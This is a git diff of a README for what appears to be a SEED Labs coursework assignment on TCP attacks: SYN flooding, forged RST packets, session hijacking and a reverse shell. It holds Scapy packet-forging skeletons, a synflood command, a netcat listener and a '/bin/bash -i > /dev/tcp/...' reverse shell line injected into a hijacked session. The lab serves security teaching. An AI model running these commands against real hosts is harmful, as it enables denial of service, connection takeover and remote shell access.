@@ -1,6 +1,6 @@
 # TCP Attacks Lab
 
-## Overview
+## Summary
 
 This lab involves various TCP attacks, including SYN Flooding, TCP RST attacks, TCP Session Hijacking, and creating a Reverse Shell. Each task requires specific steps and screenshots to demonstrate the attacks and their mitigation techniques.
 
@@ -13,123 +13,243 @@ This lab involves various TCP attacks, including SYN Flooding, TCP RST attacks, 
 2. **Ensure Docker is Set Up:**
    - Follow the instructions in section 2.1 of the [Lab PDF](https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf) to set up your environment.
 
-## Tasks
 
-### Q1 Task 1: SYN Flooding Attack
+## Q1 Task 1: SYN Flooding Attack
 
-**Objective:** Demonstrate a SYN Flooding attack and the effect of SYN cookies.
+### Overview
+A SYN Flood attack is a Denial of Service (DoS) attack where attackers send numerous SYN requests to a victim's TCP port, without completing the 3-way handshake. This overwhelms the victim's queue for half-open connections, causing legitimate connection attempts to fail.
 
-1. **SYN Flooding Overview:**
-   - SYN flooding is a Denial of Service (DoS) attack where attackers send many SYN requests to a victim’s TCP port without completing the handshake.
+### Steps
 
-   ![SYN Flooding Attack Illustration](images/tcp2.png)
+1. **Check Current SYN Queue Size**
 
-2. **Queue Size Check:**
-   - Use the command `sysctl -q net.ipv4.tcp_max_syn_backlog - 128` to check and set the queue size.
+    ```bash
+    sysctl -q net.ipv4.tcp_max_syn_backlog
+    ```
 
-3. **SYN Cookie Countermeasure:**
-   - Enable/Disable SYN cookies using:
-     ```bash
-     sudo sysctl -a | grep syncookies
-     sudo sysctl -w net.ipv4.tcp_syncookies=0 # Turn off SYN cookies
-     sudo sysctl -w net.ipv4.tcp_syncookies=1 # Turn on SYN cookies
-     ```
-   - Note: These commands don’t work inside the container; they should be set in `docker-compose.yml` if needed.
+    Output:
+    ```bash
+    net.ipv4.tcp_max_syn_backlog = 128
+    ```
 
-4. **Launching the Attack:**
-   - Compile and run the attack using:
-     ```bash
-     gcc -o synflood synflood.c
-     synflood 10.9.0.5 23
-     ```
+2. **Monitor Queue Usage**
 
-5. **Observations:**
-   - Compare the results using `netstat -nat` before and during the attack.
-   - Test connectivity from another machine using telnet.
+    ```bash
+    netstat -nat
+    ```
 
-6. **Screenshots:**
-   - **SYN cookies off, Attack in progress:** [Screenshot](TCP_Attack_without_the_SYN_cookie_mechanism.png)
-   - **SYN cookies on, Attack in progress:** [Screenshot](TCP_Attack_with_the_SYN_cookie_mechanism.png)
+    **Explanation:** Look for connections in SYN-RECV state. These are half-open connections. When the queue is full, new connections will be dropped.
 
-### Q2 Task 2: TCP RST Attacks on Telnet Connections
+3. **Configure SYN Cookie Countermeasure**
 
-**Objective:** Launch a TCP RST attack to break an established telnet connection.
+    - **Check SYN Cookie Status**
 
-1. **Manual Attack:**
-   - Use Scapy to conduct the attack. Replace placeholders with actual values from Wireshark:
-     ```python
-     #!/usr/bin/env python3
-     from scapy.all import *
-     ip = IP(src="@@@@", dst="@@@@")
-     tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
-     pkt = ip/tcp
-     ls(pkt)
-     send(pkt, verbose=0)
-     ```
+        ```bash
+        sudo sysctl -a | grep syncookies
+        ```
 
-2. **Screenshots:**
-   - **Python/Scapy Code:** [Screenshot](Q2_Python_Scapy_code.png)
-   - **Wireshark Frames:**
-     - Frame showing SEQ/ACK numbers: [Screenshot](Q2_TCP_RST_ATTACK_Wireshark_1.png)
-     - Frame showing TCP RST attack: [Screenshot](Q2_TCP_RST_ATTACK_Wireshark_2.png)
+    - **Enable SYN Cookies**
 
-3. **Optional Bonus:**
-   - Automate the attack using Scapy’s `sniff()` function. Submit a PDF with details of automation.
+        ```bash
+        sudo sysctl -w net.ipv4.tcp_syncookies=1
+        ```
 
-### Q3 Task 3: TCP Session Hijacking
+    - **Disable SYN Cookies**
 
-**Objective:** Hijack an existing TCP connection and inject malicious commands.
+        ```bash
+        sudo sysctl -w net.ipv4.tcp_syncookies=0
+        ```
 
-1. **Manual Attack:**
-   - Use Scapy to perform the session hijacking. Replace placeholders with actual values from Wireshark:
-     ```python
-     #!/usr/bin/env python3
-     from scapy.all import *
-     ip = IP(src="@@@@", dst="@@@@")
-     tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
-     data = "@@@@"
-     pkt = ip/tcp/data
-     ls(pkt)
-     send(pkt, verbose=0)
-     ```
+    **Note:** These commands may not work in a containerized environment. Update `docker-compose.yml` if needed:
 
-2. **Screenshots:**
-   - **Python/Scapy Code:** [Screenshot](Q3_Python_Scapy_code.png)
-   - **Wireshark Frames:**
-     - Frame showing SEQ/ACK numbers: [Screenshot](Q3_TCP_Session_Hijacking_Attack_before.png)
-     - Frame showing injected code: [Screenshot](Q3_TCP_Session_Hijacking_Attack_after.png)
+    ```yaml
+    sysctls:
+      - net.ipv4.tcp_syncookies=0
+    ```
 
-3. **Optional Bonus:**
-   - Automate the attack using Scapy’s `sniff()` function. Submit a PDF with details of automation.
+4. **Launch the SYN Flood Attack**
 
-### Q4 Task 4: Creating Reverse Shell using TCP Session Hijacking
+    - **Compile the Attack Code**
 
-**Objective:** Use TCP session hijacking to set up a reverse shell.
+        ```bash
+        gcc -o synflood synflood.c
+        ```
 
-1. **Reverse Shell Setup:**
-   - The reverse shell command example:
-     ```bash
-     /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
-     ```
-   - Netcat setup on the attacker machine:
-     ```bash
-     nc -lvp 9090
-     ```
+    - **Run the Attack**
 
-2. **Screenshots:**
-   - **Python/Scapy Code:** [Screenshot](Q4_Python_Scapy_code.png)
-   - **Reverse Shell Connection:** [Screenshot](Q4_reverse_shell.png)
+        ```bash
+        synflood 10.9.0.5 23
+        ```
 
-3. **Optional Bonus:**
-   - Automate the attack and setup. Submit a PDF with details of automation.
+5. **Observe and Compare**
 
-## Submission Instructions
+    - **Before Attack:** Use `netstat -nat` to check the initial state.
+    - **During Attack:** Observe the queue state and connection attempts.
 
-- Follow the [instructions](https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf) in the PDF document for submission.
-- Submit screenshots showing the VM screen with date and time for each attack.
+    **Telnet Testing:**
+    From another machine, attempt to telnet to the target during the attack.
 
-## Due Dates
+    **Expected Observation:** Telnet connection may fail if the SYN queue is full.
 
-- **Normal Due Date:** 11 Feb
-- **Earliest Acceptance Date:** 6 Feb (+1% bonus per day, up to +5% bonus for five days early)
-- **Latest Acceptance Date:** 21 Feb (-10% points)
+### Submission
+
+- **Without SYN Cookies:**
+    - Screenshot: `TCP Attack without the SYN cookie mechanism.png`
+    ![TCP Attack with the SYN cookie mechanism](images/TCP%20Attack%20without%20the%20SYN%20cookie%20mechanism.png)
+
+- **With SYN Cookies:**
+    - Screenshot: `TCP Attack with the SYN cookie mechanism.png`
+![TCP Attack with the SYN cookie mechanism](images/TCP%20Attack%20with%20the%20SYN%20cookie%20mechanism.png)
+---
+
+## Q2 Task 2: TCP RST Attacks on Telnet Connections
+
+### Overview
+A TCP RST attack involves sending a forged RST packet to terminate an active TCP connection between two victims. This can disrupt ongoing communications, such as a telnet session.
+
+### Steps
+
+1. **Prepare Scapy Code**
+
+    Skeleton Code:
+    ```python
+    #!/usr/bin/env python3
+    from scapy.all import *
+    ip = IP(src="@@@@", dst="@@@@")
+    tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
+    pkt = ip/tcp
+    ls(pkt)
+    send(pkt, verbose=0)
+    ```
+
+2. **Capture Required Values**
+
+    Use Wireshark to capture and identify values for `src`, `dst`, `sport`, `dport`, `seq`, and `ack`.
+
+3. **Execute Attack**
+
+    - **Run the Attack:**
+        ![Q2 Python Scapy code](images/Q2%20Python_Scapy%20code.png)
+
+4. **Observe and Capture**
+
+    **Wireshark Frames:**
+    Capture the SEQ/ACK numbers from the target communication and the RST packet to ensure correct values are used.
+
+5. **Optional - Automate the Attack**
+
+    **Bonus:** Automate using sniffing-and-spoofing techniques in Scapy.
+
+### Submission
+
+- **Python Code:**
+    - Screenshot: `Q2 Python_Scapy code.png`
+
+- **Attack Screenshots:**
+    - Wireshark output: `Q2 TCP RST ATTACK Wireshark 1.png` and `Q2 TCP RST ATTACK Wireshark 2.png`
+
+- **Bonus PDF (Optional):**
+    - Document automation process and verification.
+
+---
+
+## Q3 Task 3: TCP Session Hijacking
+
+### Overview
+TCP Session Hijacking involves injecting malicious content into an existing TCP session. For example, attackers can send commands to a telnet session.
+
+### Steps
+
+1. **Prepare Scapy Code**
+
+    Skeleton Code:
+    ```python
+    #!/usr/bin/env python3
+    from scapy.all import *
+    ip = IP(src="@@@@", dst="@@@@")
+    tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
+    data = "@@@@"
+    pkt = ip/tcp/data
+    ls(pkt)
+    send(pkt, verbose=0)
+    ```
+
+2. **Capture Required Values**
+
+    Use Wireshark to capture SEQ/ACK numbers from the active session.
+
+3. **Execute Attack**
+
+    - **Run the Attack:**
+
+        ```python
+        # Replace placeholders with actual values
+        ```
+
+4. **Observe and Capture**
+
+    **Wireshark Frames:**
+    Capture the SEQ/ACK numbers and injected code to verify the attack.
+
+5. **Optional - Automate the Attack**
+
+    **Bonus:** Automate using sniffing-and-spoofing techniques in Scapy.
+
+### Submission
+
+- **Python Code:**
+    - Screenshot: `Q3 Python_Scapy code.png`
+
+- **Attack Screenshots:**
+    - Wireshark output: `Q3 TCP Session Hijacking Attack before.png` and `Q3 TCP Session Hijacking Attack after.png`
+
+- **Bonus PDF (Optional):**
+    - Document automation process and verification.
+
+---
+
+## Q4 Task 4: Creating Reverse Shell using TCP Session Hijacking
+
+### Overview
+A reverse shell allows attackers to run commands on a compromised machine by injecting a reverse shell command into an existing session.
+
+### Steps
+
+1. **Set Up Netcat on Attacker Machine**
+
+    ```bash
+    nc -lvp 9090
+    ```
+
+2. **Prepare Scapy Code**
+
+    Skeleton Code:
+    ```python
+    #!/usr/bin/env python3
+    from scapy.all import *
+    ip = IP(src="@@@@", dst="@@@@")
+    tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
+    data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1"
+    pkt = ip/tcp/data
+    ls(pkt)
+    send(pkt, verbose=0)
+    ```
+
+3. **Capture Required Values**
+
+    Use Wireshark to capture SEQ/ACK numbers and inject the reverse shell command.
+
+4. **Execute Attack**
+
+    - **Run the Attack:**
+
+        ```python
+        # Replace placeholders with actual values
+        ```
+
+5. **Observe and Capture**
+
+    **Reverse Shell Connection:**
+    Verify that the attacker machine receives a shell connection.
+
+    **Expected Output:** The attacker machine should show a connected shell.
